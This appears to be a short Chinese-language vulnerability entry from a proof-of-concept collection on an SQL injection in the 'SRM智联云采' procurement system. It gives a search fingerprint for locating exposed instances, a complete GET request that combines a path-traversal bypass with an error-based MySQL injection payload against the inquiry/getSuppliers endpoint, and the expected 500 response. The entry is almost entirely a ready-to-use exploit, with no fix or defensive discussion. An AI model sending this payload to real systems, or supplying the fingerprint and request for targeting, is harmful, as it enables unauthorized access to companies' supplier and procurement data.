# SRM智联云采系统inquiry存在SQL注入漏洞

SRM ｜ SQL注入 ｜ —
- **指纹**：`title=="SRM 2.0"`
- **请求**：`GET /adpweb/static/%2e%2e;/a/srm/inquiry/getSuppliers?code=1%27+AND+GTID_SUBSET%28CONCAT%280x7178767871%2C%28SELECT+%28ELT%287973%3D7973%2C1%29%29%29%2C0x7170707671%29%2C7973%29--+AAA&name=1 HTTP/1.1`
- **响应特征**：500